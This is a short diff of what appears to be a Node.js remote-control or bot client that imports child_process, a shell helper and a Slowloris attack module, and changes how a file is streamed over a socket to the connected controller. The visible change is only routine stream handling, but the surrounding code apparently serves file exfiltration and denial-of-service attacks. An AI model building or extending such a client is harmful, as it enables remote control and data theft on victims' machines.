@@ -2,7 +2,7 @@ import net from "net";
 import util from "util";
 import child_process from "child_process";
 import process from "process";
-import fs from "fs";
+import * as fs from "fs";
 import dotenv from "dotenv";
 import changeDir from "./shell.js";
 import slowLoris from "./attacks/slowloris.js";
@@ -39,13 +39,17 @@ function clearIntervalConnect() {
 function sendFile(filePath) {
 	const fileStream = fs.createReadStream(filePath);
 
+	fileStream.on("data", (chunk) => {
+		client.write(chunk);
+	})
+
 	fileStream.on("error", (err) => {
 		console.log(err);
 	});
 
-	fileStream.on("open", () => {
-		fileStream.pipe(client);
-	});
+	// fileStream.on("open", () => {
+	// 	fileStream.pipe(client);
+	// });
 }
 
 client.on("data", (data) => {
